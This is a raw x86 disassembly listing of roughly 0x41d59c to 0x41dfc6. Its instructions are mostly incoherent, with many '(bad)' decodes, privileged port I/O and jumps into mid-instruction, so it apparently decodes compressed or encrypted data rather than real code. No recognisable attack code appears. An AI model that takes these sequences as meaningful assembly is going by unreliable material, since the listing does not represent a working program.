  41d59c:	das    
  41d59d:	mov    eax,0x93874688
  41d5a2:	sbb    edi,DWORD PTR [edi+0x14]
  41d5a5:	ret    0x753
  41d5a8:	jno    0x41d568
  41d5aa:	mov    bh,0x32
  41d5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5ad:	xchg   DWORD PTR [edi],edx
  41d5af:	sub    eax,0x89a52b76
  41d5b4:	jle    0x41d597
  41d5b6:	mov    al,ds:0x3ec8dc25
  41d5bb:	jp     0x41d561
  41d5bd:	out    0x87,al
  41d5bf:	leave  
  41d5c0:	aam    0x45
  41d5c2:	icebp  
  41d5c3:	int3   
  41d5c4:	aas    
  41d5c5:	dec    ebp
  41d5c6:	in     eax,0x2c
  41d5c8:	push   ebp
  41d5c9:	cmp    BYTE PTR [edx-0x25],ah
  41d5cc:	in     al,0x15
  41d5ce:	test   dl,cl
  41d5d0:	aaa    
  41d5d1:	or     al,0x75
  41d5d3:	xchg   esi,eax
  41d5d4:	sahf   
  41d5d5:	and    ecx,esp
  41d5d7:	fcom   QWORD PTR [esi+0x1f]
  41d5da:	push   esp
  41d5db:	enter  0x9de7,0x7c
  41d5df:	pop    ds
  41d5e0:	fnstcw WORD PTR [edi]
  41d5e2:	dec    esi
  41d5e3:	jmp    0x41d5c5
  41d5e5:	pop    ds
  41d5e6:	cmp    al,0x1e
  41d5e8:	pop    ebx
  41d5e9:	fcom   st(7)
  41d5eb:	jns    0x41d57d
  41d5ed:	lods   eax,DWORD PTR es:[esi]
  41d5ef:	ds inc eax
  41d5f1:	mov    al,0xa3
  41d5f3:	addr16 lahf 
  41d5f5:	lds    ebx,FWORD PTR [edx]
  41d5f7:	and    al,0xac
  41d5f9:	push   edi
  41d5fa:	xor    eax,0xb45a756c
  41d5ff:	xor    BYTE PTR [edi],dh
  41d601:	fild   WORD PTR cs:[eax+0x44d4f2e8]
  41d608:	cmp    edx,DWORD PTR [ebp-0x77]
  41d60b:	sbb    ecx,0x65
  41d60e:	pop    ds
  41d60f:	mov    dl,0x12
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xf66e435
  41d681:	push   edx
  41d682:	ret    0xd50b
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR ds:0xd1000001,al
  41d68d:	ret    0xb355
  41d690:	mov    db6,esi
  41d693:	ss mov ah,0x4d
  41d696:	or     esi,DWORD PTR [edx+0x13]
  41d699:	into   
  41d69a:	lds    ebp,FWORD PTR [edi]
  41d69c:	push   edi
  41d69d:	ds nop
  41d69f:	cmp    al,0xb1
  41d6a1:	rcl    DWORD PTR [eax],0x2f
  41d6a4:	test   al,0xce
  41d6a6:	ins    DWORD PTR es:[edi],dx
  41d6a7:	in     al,dx
  41d6a8:	dec    edx
  41d6a9:	js     0x41d670
  41d6ab:	sbb    eax,0x4aaf7374
  41d6b0:	mov    dl,0xb8
  41d6b2:	or     esi,DWORD PTR [esi+0x5926e652]
  41d6b8:	sbb    al,0x6b
  41d6ba:	sbb    eax,0x8e2dd31d
  41d6bf:	jmp    0x41d6b8
  41d6c1:	xor    BYTE PTR [ebx-0x7f76e776],dh
  41d6c7:	cmp    DWORD PTR [ebp+eax*4-0x49c80cde],eax
  41d6ce:	xor    eax,0x8240459f
  41d6d3:	push   edx
  41d6d4:	jl     0x41d72d
  41d6d6:	inc    ebx
  41d6d7:	outs   dx,DWORD PTR ds:[esi]
  41d6d8:	and    BYTE PTR [ebx+0x26],bl
  41d6db:	adc    eax,0xc7cd6202
  41d6e0:	push   ebp
  41d6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6e2:	sbb    dh,0x19
  41d6e5:	lea    esp,[ebx+0x36]
  41d6e8:	jnp    0x41d75c
  41d6ea:	pop    ebp
  41d6eb:	mov    DWORD PTR [ebx],ebp
  41d6ed:	icebp  
  41d6ee:	mov    BYTE PTR [ebp+0x7a7e20f1],cl
  41d6f4:	fstp   st(3)
  41d6f6:	in     eax,0x17
  41d6f8:	div    edx
  41d6fa:	fist   DWORD PTR [edi+0x63df5046]
  41d700:	ins    BYTE PTR es:[edi],dx
  41d701:	mov    cl,bl
  41d703:	sti    
  41d704:	inc    esp
  41d705:	dec    eax
  41d706:	rcr    esp,1
  41d708:	sbb    ecx,DWORD PTR [edx+0x35]
  41d70b:	ins    BYTE PTR es:[edi],dx
  41d70c:	(bad)  
  41d70d:	aam    0xe2
  41d70f:	pop    edx
  41d710:	lahf   
  41d711:	int3   
  41d712:	add    ah,bh
  41d714:	scas   eax,DWORD PTR es:[edi]
  41d715:	adc    edx,0x7633ca46
  41d71b:	add    bh,BYTE PTR [eax]
  41d71d:	sbb    al,0x38
  41d71f:	sbb    eax,0xdbe750f
  41d724:	jge    0x41d753
  41d726:	xchg   ebp,eax
  41d727:	fwait
  41d728:	lods   al,BYTE PTR ds:[esi]
  41d729:	push   ecx
  41d72a:	sub    BYTE PTR [eax-0x72],dh
  41d72d:	pushf  
  41d72e:	idiv   BYTE PTR [esi-0x6d]
  41d731:	std    
  41d732:	fwait
  41d733:	loopne 0x41d703
  41d735:	mov    ebx,0x8639b117
  41d73a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d73b:	sbb    al,0xe
  41d73d:	inc    ebp
  41d73e:	xor    al,0x6f
  41d740:	and    eax,eax
  41d742:	imul   esp,DWORD PTR [edi+ebx*2+0x28face3d],0xb2b21d5f
  41d74d:	or     edi,DWORD PTR [edx]
  41d74f:	cs das 
  41d751:	and    bl,ah
  41d753:	pop    esp
  41d754:	and    DWORD PTR [eax],ebp
  41d756:	xchg   ebx,eax
  41d757:	fwait
  41d758:	jg     0x41d761
  41d75a:	jmp    0xf21fb10
  41d75f:	sub    al,0xd
  41d761:	icebp  
  41d762:	fstp   TBYTE PTR [esi]
  41d764:	dec    ecx
  41d765:	ja     0x41d6f4
  41d767:	cmp    BYTE PTR [eax+0x67653730],0x1a
  41d76e:	mov    edx,0x8d591a78
  41d773:	add    al,cl
  41d775:	add    al,0x7f
  41d777:	mov    al,0x1d
  41d779:	xor    BYTE PTR [esi-0x10],cl
  41d77c:	loope  0x41d711
  41d77e:	movmskps ebp,xmm2
  41d781:	sahf   
  41d782:	jmp    0x41d766
  41d784:	push   edx
  41d785:	gs lock dec ecx
  41d788:	das    
  41d789:	dec    edi
  41d78a:	inc    ecx
  41d78b:	icebp  
  41d78c:	xchg   esi,eax
  41d78d:	std    
  41d78e:	out    dx,eax
  41d78f:	jae    0x41d7d3
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	adc    cl,BYTE PTR [esi+0x23]
  41d803:	call   0x105:0x139da
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	or     ah,BYTE PTR ds:0x15a6d33b
  41d812:	aad    0xcc
  41d814:	inc    esp
  41d815:	in     eax,dx
  41d816:	cmp    edi,ebp
  41d818:	fsub   st(0),st
  41d81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d81b:	lds    edi,FWORD PTR [esi-0x72cf4380]
  41d821:	pop    ss
  41d822:	(bad)  
  41d823:	adc    ah,bh
  41d825:	retf   0xbcaf
  41d828:	jecxz  0x41d7d1
  41d82a:	and    eax,0xc8a28da3
  41d82f:	out    0x2e,al
  41d831:	retf   0x94e
  41d834:	aad    0xa8
  41d836:	inc    ebp
  41d837:	sbb    eax,DWORD PTR [ebp+eiz*8+0x23]
  41d83b:	and    BYTE PTR [ecx+0x39180256],ch
  41d841:	fbld   TBYTE PTR [edx-0x4cbddaf0]
  41d847:	inc    eax
  41d848:	inc    esi
  41d849:	xlat   BYTE PTR ds:[ebx]
  41d84a:	push   ecx
  41d84b:	and    al,0xe7
  41d84d:	xor    esi,DWORD PTR [esi-0xc91f0c9]
  41d853:	cmp    al,BYTE PTR [ebp+0x748e9072]
  41d859:	mov    al,0xe1
  41d85b:	shl    DWORD PTR [edi+0x34228c58],0xea
  41d862:	out    dx,eax
  41d863:	enter  0x2345,0xb3
  41d867:	jle    0x41d818
  41d869:	(bad)  
  41d86a:	out    dx,eax
  41d86b:	mov    edx,?
  41d86d:	and    esp,edi
  41d86f:	cmp    DWORD PTR [eax-0x18],0xe92f0ca
  41d876:	mov    ebp,ecx
  41d878:	leave  
  41d879:	sti    
  41d87a:	jbe    0x41d8e4
  41d87c:	int    0xb2
  41d87e:	or     BYTE PTR [eax],ch
  41d880:	and    edi,DWORD PTR [edi]
  41d882:	sti    
  41d883:	call   0xdec15727
  41d888:	cmp    BYTE PTR [ebx+0x19],cl
  41d88b:	push   edi
  41d88c:	dec    edx
  41d88d:	add    DWORD PTR [edi+0x55e6c70c],0xffffff8d
  41d894:	and    edi,DWORD PTR [ebx+0x6092ba15]
  41d89a:	add    eax,0x61c7ab72
  41d89f:	daa    
  41d8a0:	and    DWORD PTR [ebp-0x10],ebx
  41d8a3:	enter  0xef4c,0xbb
  41d8a7:	mov    ecx,0xab78456f
  41d8ac:	gs cmp eax,0x79a9ae9d
  41d8b2:	or     DWORD PTR [ecx-0x4f],0x1cc9be6c
  41d8b9:	jl     0x41d8dd
  41d8bb:	addr16 int3 
  41d8bd:	fs gs inc ebx
  41d8c0:	ja     0x41d8c3
  41d8c2:	ror    ah,cl
  41d8c4:	es std 
  41d8c6:	or     bl,BYTE PTR [esi-0x76]
  41d8c9:	sub    ebx,DWORD PTR ds:0xef94731e
  41d8cf:	call   edi
  41d8d1:	mov    ds:0x6abffd97,eax
  41d8d6:	sahf   
  41d8d7:	push   eax
  41d8d8:	pop    ds
  41d8d9:	adc    al,0x2d
  41d8db:	jo     0x41d8f8
  41d8dd:	jae    0x41d903
  41d8df:	xchg   ebx,eax
  41d8e0:	ret    0x6ab4
  41d8e3:	and    DWORD PTR [ebp+0x1a],ebp
  41d8e6:	add    edi,0xffffffaf
  41d8e9:	jmp    0x945c74cc
  41d8ee:	stos   BYTE PTR es:[edi],al
  41d8ef:	xchg   esp,eax
  41d8f0:	bound  eax,QWORD PTR [ecx-0x1d]
  41d8f3:	loope  0x41d89d
  41d8f5:	or     al,0x23
  41d8f7:	ins    BYTE PTR es:[edi],dx
  41d8f8:	xor    dh,ch
  41d8fa:	mov    edi,0x64835afb
  41d8ff:	jo     0x41d946
  41d901:	or     eax,0xdfc02ba1
  41d906:	ret    
  41d907:	sbb    dl,al
  41d909:	shr    DWORD PTR ss:[esi+0x1125682e],0x3d
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs jno 0x41d9c6
  41d982:	inc    ebx
  41d983:	(bad)  
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0x41000001
  41d98d:	fisttp QWORD PTR [ebp+eiz*1-0x51]
  41d991:	and    al,0x90
  41d993:	xchg   esi,eax
  41d994:	(bad)  
  41d995:	popa   
  41d996:	popf   
  41d997:	test   al,0x82
  41d999:	adc    bl,dl
  41d99b:	pusha  
  41d99c:	es dec esi
  41d99e:	rol    DWORD PTR [ebp-0xa86f635],0xe2
  41d9a5:	arpl   sp,bp
  41d9a7:	mov    al,ds:0x5994aac5
  41d9ac:	leave  
  41d9ad:	mov    esi,0xd618e023
  41d9b2:	popa   
  41d9b3:	std    
  41d9b4:	inc    esp
  41d9b5:	test   eax,0x5b0d2591
  41d9ba:	fnstcw WORD PTR [edx]
  41d9bc:	pop    edi
  41d9bd:	(bad)  
  41d9be:	dec    esp
  41d9bf:	shr    BYTE PTR [esp+eiz*4],0xca
  41d9c3:	mov    esi,0xada92bb9
  41d9c8:	dec    esp
  41d9c9:	or     eax,0x6806273d
  41d9ce:	fdiv   st,st(1)
  41d9d0:	or     esp,DWORD PTR [ecx+edx*2]
  41d9d3:	int    0x43
  41d9d5:	data16 das 
  41d9d7:	jl     0x41da1c
  41d9d9:	ja     0x41da29
  41d9db:	mov    edx,0xc1bb2fe9
  41d9e0:	sti    
  41d9e1:	mov    cl,0xb9
  41d9e3:	xlat   BYTE PTR ds:[ebx]
  41d9e4:	or     al,0x92
  41d9e6:	dec    esp
  41d9e7:	mov    ebx,0xff7ec830
  41d9ec:	mov    al,ds:0x9ddca36c
  41d9f1:	mov    eax,ds:0xc66a086b
  41d9f6:	pop    esi
  41d9f7:	mov    es,esp
  41d9f9:	dec    esp
  41d9fa:	daa    
  41d9fb:	js     0x41da32
  41d9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9fe:	loop   0x41da66
  41da00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da01:	adc    al,0xde
  41da03:	xchg   ebp,eax
  41da04:	dec    ebp
  41da05:	mov    esp,0x7f609871
  41da0a:	int3   
  41da0b:	push   esi
  41da0c:	lock popa 
  41da0e:	out    0xba,al
  41da10:	mov    cl,0x0
  41da12:	aad    0xfe
  41da14:	and    bl,BYTE PTR [edx+0x4a]
  41da17:	call   0x147f:0x7df99ae
  41da1e:	mov    eax,0xbb249400
  41da23:	movhps xmm6,QWORD PTR [ebx-0x12]
  41da27:	(bad)
  41da2a:	jge    0x41da2f
  41da2c:	ins    BYTE PTR es:[edi],dx
  41da2d:	jecxz  0x41d9e4
  41da2f:	inc    edi
  41da30:	sub    DWORD PTR ds:[esi-0x53],ecx
  41da34:	and    BYTE PTR [ebx-0x3b9cdd11],dl
  41da3a:	icebp  
  41da3b:	imul   DWORD PTR [eax-0x988c278]
  41da41:	pop    ebx
  41da42:	loope  0x41da3f
  41da44:	push   eax
  41da45:	xlat   BYTE PTR ds:[ebx]
  41da46:	dec    ebp
  41da47:	or     eax,0xefa87dae
  41da4c:	xor    ch,BYTE PTR cs:[edi+0xf7f2782]
  41da53:	adc    bh,BYTE PTR [edx-0x5df2d723]
  41da59:	(bad)  
  41da5a:	in     al,0x26
  41da5c:	pop    ss
  41da5d:	sbb    DWORD PTR [esp+edi*4+0x3c9d2b3c],ebp
  41da64:	repz ds fwait
  41da67:	pop    ecx
  41da68:	(bad)  
  41da69:	loop   0x41da60
  41da6b:	mov    eax,ds:0xbebf617f
  41da70:	jmp    0x67d5:0x48c494ee
  41da77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da78:	fisubr DWORD PTR [edx]
  41da7a:	fadd   QWORD PTR [eax-0x64]
  41da7d:	inc    esi
  41da7e:	jmp    0x41dada
  41da80:	inc    edi
  41da81:	adc    ecx,esp
  41da83:	mov    ah,ch
  41da85:	sahf   
  41da86:	vpunpckhbw xmm1,xmm1,XMMWORD PTR [ecx]
  41da8a:	pop    esi
  41da8b:	push   esp
  41da8c:	imul   ebp,DWORD PTR ds:0x778164,0x0
	...
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffab
  41db01:	sbb    bl,BYTE PTR ds:0x13be4d4
  41db07:	add    BYTE PTR ds:0x70000001,al
  41db0d:	test   DWORD PTR [esi+0x7a70ccdc],0x6ddc79c
  41db17:	fcomp  DWORD PTR [esi]
  41db19:	add    DWORD PTR [edx+0x76bfad30],ebp
  41db1f:	js     0x41db22
  41db21:	cs mov ebp,0x79804b14
  41db27:	mov    bl,0xd5
  41db29:	in     al,0xaf
  41db2b:	sub    ch,BYTE PTR [ebx]
  41db2d:	call   0xab3:0x382c6e82
  41db34:	add    DWORD PTR [edi],ebp
  41db36:	push   ebp
  41db37:	ss jmp 0x498d:0x4d13aaf
  41db3f:	fldcw  WORD PTR [eax-0x28eddf09]
  41db45:	ret    
  41db46:	(bad)  
  41db47:	out    0xdb,eax
  41db49:	cmc    
  41db4a:	fisubr WORD PTR [esi+0x73]
  41db4d:	and    al,0x7d
  41db4f:	aam    0x68
  41db51:	cdq    
  41db52:	pcmpeqd mm5,mm7
  41db55:	test   BYTE PTR [edi],dh
  41db57:	ins    DWORD PTR es:[edi],dx
  41db58:	pop    ss
  41db59:	add    al,0xfe
  41db5b:	mov    gs,WORD PTR [ebx-0x5d]
  41db5e:	in     eax,dx
  41db5f:	ja     0x41db20
  41db61:	xchg   edx,eax
  41db62:	sub    DWORD PTR [edx],0xffffffb2
  41db65:	jmp    0x41dafb
  41db67:	das    
  41db68:	pushf  
  41db69:	mov    cl,0x8a
  41db6b:	xor    DWORD PTR [ebx],esi
  41db6d:	ins    DWORD PTR es:[edi],dx
  41db6e:	pop    ebp
  41db6f:	xor    eax,0x7dfb4f36
  41db74:	push   ss
  41db75:	cmp    DWORD PTR [eax-0x239e0ec3],0xfffffff2
  41db7c:	push   eax
  41db7d:	lock mov es,WORD PTR [edi-0xf5afa56]
  41db84:	jecxz  0x41db6a
  41db86:	dec    edx
  41db87:	icebp  
  41db88:	add    al,0x6c
  41db8a:	(bad)  [ebx-0x24]
  41db8d:	lods   eax,DWORD PTR ds:[esi]
  41db8e:	or     al,0x9a
  41db90:	push   0x7d
  41db92:	push   cs
  41db93:	xchg   esp,eax
  41db94:	cli    
  41db95:	mov    ds:0xd2a4cc8a,eax
  41db9a:	adc    esi,DWORD PTR [edx+0x6f]
  41db9d:	mov    ah,0xb6
  41db9f:	adc    eax,0x110c2a3e
  41dba4:	adc    edi,DWORD PTR es:[esi-0x2b]
  41dba8:	bnd jmp 0xb15268cb
  41dbae:	mov    al,ds:0x91d076a3
  41dbb3:	xchg   DWORD PTR ds:0x9d2fa190,edi
  41dbb9:	int3   
  41dbba:	mov    edi,0x10bd286d
  41dbbf:	mov    eax,fs
  41dbc1:	adc    eax,0x6e534ec2
  41dbc6:	push   edi
  41dbc7:	adc    DWORD PTR [ebx-0x80],ebp
  41dbca:	fnop   
  41dbcc:	imul   dh
  41dbce:	pop    ebp
  41dbcf:	push   es
  41dbd0:	pop    esi
  41dbd1:	or     ah,BYTE PTR [ebp+0x48]
  41dbd4:	ds or  eax,0x3bb1dc21
  41dbda:	jno    0x41db8d
  41dbdc:	sub    cl,al
  41dbde:	scas   al,BYTE PTR es:[edi]
  41dbdf:	adc    edx,DWORD PTR [edi-0x66]
  41dbe2:	cdq    
  41dbe3:	gs mov eax,0xd6977243
  41dbe9:	pop    ebp
  41dbea:	mov    eax,ds:0xd378cb4e
  41dbef:	fisttp DWORD PTR [eax-0x139ca94e]
  41dbf5:	lods   al,BYTE PTR ds:[esi]
  41dbf6:	call   FWORD PTR [edi+0x26f8b17]
  41dbfc:	mov    ebx,0x3693e70b
  41dc01:	push   esi
  41dc02:	gs dec esp
  41dc04:	mov    ah,0xb6
  41dc06:	jl     0x41dbf3
  41dc08:	mov    dh,0x19
  41dc0a:	aas    
  41dc0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc0c:	jns    0x41dc73
  41dc0e:	push   ebx
  41dc0f:	and    ecx,DWORD PTR [esi+0x0]
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x26b0d050]
  41dc81:	ficom  WORD PTR [edi*4+0x13ce9]
  41dc88:	add    eax,0x4d000001
  41dc8d:	pop    ecx
  41dc8e:	jae    0x41dd0a
  41dc90:	dec    edi
  41dc91:	xchg   edi,eax
  41dc92:	and    BYTE PTR [ebp+0x750ba77c],0xf0
  41dc99:	adc    BYTE PTR [ebx],dh
  41dc9b:	aas    
  41dc9c:	enter  0x250b,0xdc
  41dca0:	aas    
  41dca1:	and    DWORD PTR [ebx-0x6e],esp
  41dca4:	xor    eax,0x82d2d876
  41dca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcaa:	sti    
  41dcab:	ror    esi,0x8e
  41dcae:	popf   
  41dcaf:	mov    esp,0xc4a7145e
  41dcb4:	mov    edx,0xbad8d063
  41dcb9:	popf   
  41dcba:	cmc    
  41dcbb:	mov    eax,ds:0x9cabad71
  41dcc0:	dec    esi
  41dcc1:	(bad)  
  41dcc2:	pushf  
  41dcc3:	in     al,0x7e
  41dcc5:	cli    
  41dcc6:	inc    edi
  41dcc7:	das    
  41dcc8:	sbb    BYTE PTR [ebx+eax*8-0x76943970],0x7
  41dcd0:	push   cs
  41dcd1:	adc    edi,DWORD PTR [edx-0x509f4134]
  41dcd7:	inc    esp
  41dcd8:	adc    ebp,DWORD PTR [eax]
  41dcda:	push   esp
  41dcdb:	call   0x74d2:0x2f9a6fd6
  41dce2:	xchg   ecx,eax
  41dce3:	pop    edx
  41dce4:	mov    ah,0x26
  41dce6:	push   0x1c
  41dce8:	push   edx
  41dce9:	lods   al,BYTE PTR ds:[esi]
  41dcea:	xor    al,0xd7
  41dcec:	repnz push ebx
  41dcee:	jns    0x41dc95
  41dcf0:	call   0xe82d6c3c
  41dcf5:	dec    esi
  41dcf6:	rcr    BYTE PTR [edi],0x44
  41dcf9:	jmp    0x112:0xbab57270
  41dd00:	dec    esi
  41dd01:	and    al,0x60
  41dd03:	sub    bh,BYTE PTR ds:0xe4f300
  41dd09:	sbb    BYTE PTR [eax+0x7abc0d1c],bl
  41dd0f:	inc    edx
  41dd10:	mov    al,ds:0x675f2904
  41dd15:	mov    al,al
  41dd17:	mov    ebx,0x9cb97b8f
  41dd1c:	pusha  
  41dd1d:	add    edx,DWORD PTR ds:[ecx-0x40a573ed]
  41dd24:	jl     0x41dcd2
  41dd26:	add    al,BYTE PTR [ecx-0x13]
  41dd29:	dec    edi
  41dd2a:	in     eax,0x6
  41dd2c:	dec    edx
  41dd2d:	aad    0xe4
  41dd2f:	jle    0x41dd55
  41dd31:	and    eax,DWORD PTR [edi+0x4baf41e6]
  41dd37:	(bad)  
  41dd38:	cmp    DWORD PTR [ecx+esi*4+0x28],eax
  41dd3c:	xor    bh,BYTE PTR [esi-0x330e531d]
  41dd42:	out    0x7f,al
  41dd44:	sub    DWORD PTR [ecx+0x24de8bb0],edi
  41dd4a:	sub    eax,0x330e2d38
  41dd4f:	xchg   edi,eax
  41dd50:	push   esp
  41dd51:	out    0xc1,al
  41dd53:	(bad)  
  41dd54:	daa    
  41dd55:	mov    edx,0x9e4d89a2
  41dd5a:	and    DWORD PTR [ebx],esi
  41dd5c:	call   0x8a5f:0x2139ccc0
  41dd63:	scas   al,BYTE PTR es:[edi]
  41dd64:	pop    edx
  41dd65:	jbe    0x41dde6
  41dd67:	std    
  41dd68:	pop    edi
  41dd69:	push   cs
  41dd6a:	and    al,cl
  41dd6c:	xchg   ch,dh
  41dd6e:	lods   al,BYTE PTR ds:[esi]
  41dd6f:	test   al,0xa0
  41dd71:	lods   eax,DWORD PTR ds:[esi]
  41dd72:	cli    
  41dd73:	loop   0x41dd23
  41dd75:	dec    edi
  41dd76:	icebp  
  41dd77:	mov    bh,0xfb
  41dd79:	mov    ch,0x49
  41dd7b:	fwait
  41dd7c:	mov    esp,0xbe89968f
  41dd81:	int3   
  41dd82:	lods   al,BYTE PTR ds:[esi]
  41dd83:	add    ebp,0x2b
  41dd86:	sub    BYTE PTR [edx-0x17],ch
  41dd89:	popa   
  41dd8a:	sbb    DWORD PTR [ebx+0x4f],eax
  41dd8d:	cmp    cl,ah
  41dd8f:	loopne 0x41ddb3
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	sub    bl,dh
  41de02:	xchg   esp,eax
  41de03:	sbb    eax,0x13dee
  41de08:	add    eax,0x5d000001
  41de0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de0e:	lds    edx,FWORD PTR [edi-0x3f]
  41de11:	mov    al,0x65
  41de13:	mov    ebp,0xad7af942
  41de18:	sbb    al,BYTE PTR [edi+0x572cf32a]
  41de1e:	test   eax,0xd22ee19a
  41de23:	std    
  41de24:	xchg   edi,eax
  41de25:	and    eax,DWORD PTR [esi-0x2a5ce275]
  41de2b:	push   eax
  41de2c:	mov    ds:0x106fab9,al
  41de31:	test   al,0x47
  41de33:	pop    eax
  41de34:	cmp    BYTE PTR [eax-0x2978d12c],0x24
  41de3b:	scas   eax,DWORD PTR es:[edi]
  41de3c:	xlat   BYTE PTR ds:[ebx]
  41de3d:	gs cmp eax,0x3a07330f
  41de43:	call   DWORD PTR [ecx+0x5afbaf5c]
  41de49:	cmp    al,0x3
  41de4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de4c:	ret    
  41de4d:	pop    ecx
  41de4e:	test   BYTE PTR [esi+ecx*4+0x7c],dl
  41de52:	fwait
  41de53:	scas   al,BYTE PTR es:[edi]
  41de54:	dec    ebp
  41de55:	cmp    eax,0x7bd72442
  41de5a:	sub    al,0xc
  41de5c:	(bad)  
  41de5d:	sti    
  41de5e:	and    ch,bh
  41de60:	dec    edx
  41de61:	cwde   
  41de62:	ja     0x41de88
  41de64:	jno    0x41dece
  41de66:	fwait
  41de67:	lea    ecx,[ecx-0x5f6b5083]
  41de6d:	xchg   edx,eax
  41de6e:	dec    edi
  41de6f:	inc    eax
  41de70:	add    BYTE PTR [edi],cl
  41de72:	fnstsw WORD PTR [ebx]
  41de74:	mov    dl,0x5b
  41de76:	ins    DWORD PTR es:[edi],dx
  41de77:	pop    esp
  41de78:	cwde   
  41de79:	mov    ecx,0xd2a2a31c
  41de7e:	popf   
  41de7f:	sbb    BYTE PTR ds:0xb1af8006,al
  41de85:	pop    es
  41de86:	out    0x33,al
  41de88:	ror    ebx,1
  41de8a:	in     al,0x40
  41de8c:	bound  ebx,QWORD PTR [eax]
  41de8e:	and    eax,0xa2bc89a8
  41de93:	push   cs
  41de94:	out    0x3c,eax
  41de96:	sub    DWORD PTR [ebp-0xd],0xffffffa5
  41de9a:	push   edx
  41de9b:	fnstcw WORD PTR [esi-0x74c4c20d]
  41dea1:	inc    ebx
  41dea2:	jmp    0x4734:0xa3a096c3
  41dea9:	sub    eax,0xd0ddd18e
  41deae:	jmp    DWORD PTR [ebp+esi*4-0x26c206f8]
  41deb5:	inc    ebx
  41deb6:	xchg   ecx,eax
  41deb7:	add    bh,dl
  41deb9:	sbb    eax,0x8f74a0e9
  41debe:	fs (bad) 
  41dec0:	mov    ebp,0x5e4b3486
  41dec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dec6:	sbb    bl,BYTE PTR [ebx+0x12]
  41dec9:	and    BYTE PTR [eax],0xdf
  41decc:	ret    
  41decd:	ins    DWORD PTR es:[edi],dx
  41dece:	add    bh,BYTE PTR [esi-0x3707cb21]
  41ded4:	(bad)  
  41ded5:	je     0x41dec2
  41ded7:	push   ebx
  41ded8:	mov    ch,0xa8
  41deda:	hlt    
  41dedb:	push   ebx
  41dedc:	out    0x1b,eax
  41dede:	ss repz lock and al,0xbd
  41dee3:	(bad)  
  41dee4:	mov    dl,0xe7
  41dee6:	and    eax,0xdc15d9f0
  41deeb:	dec    eax
  41deec:	inc    edx
  41deed:	lahf   
  41deee:	push   ss
  41deef:	scas   al,BYTE PTR es:[edi]
  41def0:	neg    DWORD PTR [ecx+0x2f]
  41def3:	in     eax,dx
  41def4:	add    al,0xfb
  41def6:	xor    DWORD PTR [ebp-0x6040f66d],0x4b
  41defd:	ja     0x41dea3
  41deff:	syscall 
  41df01:	or     ebp,DWORD PTR [edi+0x7361dc6a]
  41df07:	mov    al,ds:0xdb1520d5
  41df0c:	rol    BYTE PTR [ebp+edx*2+0x19],1
  41df10:	out    0x0,al
	...
  41df72:	add    BYTE PTR [eax],al
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xc3319ce9
  41df82:	xchg   edi,eax
  41df83:	jmp    0x431e7b
  41df88:	add    eax,0x5c000001
  41df8d:	aaa    
  41df8e:	je     0x41dfbb
  41df90:	in     al,0xd3
  41df92:	int    0x41
  41df94:	inc    esp
  41df95:	and    al,0x51
  41df97:	lock shr DWORD PTR [esi+0x1d],1
  41df9b:	imul   BYTE PTR [edx+0x14]
  41df9e:	mov    eax,esi
  41dfa0:	xor    BYTE PTR [ebx-0x80],ah
  41dfa3:	into   
  41dfa4:	add    ebx,DWORD PTR [edx+0x7c4f6184]
  41dfaa:	dec    edx
  41dfab:	sbb    DWORD PTR [eax],esp
  41dfad:	iret   
  41dfae:	xor    BYTE PTR [eax+0x4a],ah
  41dfb1:	mov    al,ds:0x3dded93a
  41dfb6:	inc    esi
  41dfb7:	push   esi
  41dfb8:	lock adc cl,cl
  41dfbb:	mov    ds,WORD PTR gs:[ecx+ebp*2-0x2b]
  41dfc0:	adc    esp,0x733e8824
  41dfc6:	loop   0x41df7b
